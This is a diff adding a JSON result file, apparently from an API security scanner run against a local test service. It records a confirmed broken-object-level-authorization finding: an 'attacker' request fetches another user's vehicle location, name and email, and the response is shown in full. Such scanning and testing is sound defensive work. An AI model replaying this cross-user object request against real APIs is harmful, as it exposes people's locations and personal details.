@@ -1,0 +1,36 @@
+{
+  "test_id": "BOLA-001",
+  "timestamp": "20260816T160026Z",
+  "request": {
+    "victim": {
+      "method": "GET",
+      "url": "http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location"
+    },
+    "attacker": {
+      "method": "GET",
+      "url": "http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location"
+    }
+  },
+  "response": {
+    "victim": {
+      "status_code": 200,
+      "response_body": "{\"carId\":\"f89b5f21-7829-45cb-a650-299a61090378\",\"vehicleLocation\":{\"id\":1,\"latitude\":\"32.778889\",\"longitude\":\"-91.919243\"},\"fullName\":\"Adam\",\"email\":\"adam007@example.com\"}",
+      "response_time_ms": 2052.349
+    },
+    "attacker": {
+      "status_code": 200,
+      "response_body": "{\"carId\":\"f89b5f21-7829-45cb-a650-299a61090378\",\"vehicleLocation\":{\"id\":1,\"latitude\":\"32.778889\",\"longitude\":\"-91.919243\"},\"fullName\":\"Adam\",\"email\":\"adam007@example.com\"}",
+      "response_time_ms": 2091.454
+    }
+  },
+  "validation": {
+    "confirmed": true,
+    "severity": "HIGH",
+    "title": "Broken Object Level Authorization",
+    "explanation": "An authenticated user received a successful response for an object belonging to another authorization context.",
+    "evidence": {
+      "attacker_status": 200,
+      "response_body": "{\"carId\":\"f89b5f21-7829-45cb-a650-299a61090378\",\"vehicleLocation\":{\"id\":1,\"latitude\":\"32.778889\",\"longitude\":\"-91.919243\"},\"fullName\":\"Adam\",\"email\":\"adam007@example.com\"}"
+    }
+  }
+}
